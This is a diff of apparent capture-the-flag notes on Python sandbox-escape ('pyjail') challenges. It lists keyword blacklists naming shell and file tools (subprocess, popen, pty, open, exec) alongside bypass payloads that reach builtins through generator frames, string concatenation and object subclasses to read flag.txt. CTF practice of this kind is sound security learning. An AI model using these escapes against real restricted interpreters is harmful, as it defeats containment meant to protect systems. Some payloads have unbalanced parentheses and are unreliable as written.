@@ -117,3 +117,19 @@ WRONG_PATH = ["__class__", "__base__", "__subclasses__", "__mro__", "__builtins_
 INTENDED SOLVE: print(opopenen("flag.txt","r").rereadad())
 WHAT RUNNED   : exec('print(op'+''+'en("flag.txt","r").re'+''+'ad()))
 output: FLAG{FLAG}
+
+#(protocol_2.py -- MRSM Hacklaa!)
+BLACKLIST = [
+    "import", "os", "sys", "exec","open", "read", "write","getattr", "setattr", "delattr", "hasattr","globals", "locals", "vars", "dir", "compile", "breakpoint", "subprocess", "popen",]
+FOUND SOLVE: print(print.__self__.tuple((_ for _ in ()).gi_frame.f_builtins['op'+'en']('flag.txt')))
+output: FLAG{FLAG}
+
+#(protocol_3.py -- MRSM Hacklaa!)
+BLACKLIST = [ "import", "os", "sys", "exec","open", "read", "write","getattr", "setattr", "delattr", "hasattr","globals", "locals", "vars", "dir", "compile", "breakpoint", "subprocess", "popen",]
+FOUND SOLVE: a=print.__self__; print(().__class__.__base__.__subclasses__()  #then, search for the odd __main__ class
+output: object.__subclasses__()
+
+#(protocol_4.py -- MRSM Hacklaa!)
+BLACKLIST = [  "import", "os", "system", "eval", "exec", "open","read", "write", "popen", "subprocess", "pty","compile", "globals", "locals", "vars", "getattr", "setattr", "delattr", "hasattr", "__loader__", "__spec__", "linecache", "builtins"]
+FOUND SOLVE: print(_MariVault.__doc__)
+output: FLAG{FLAG}
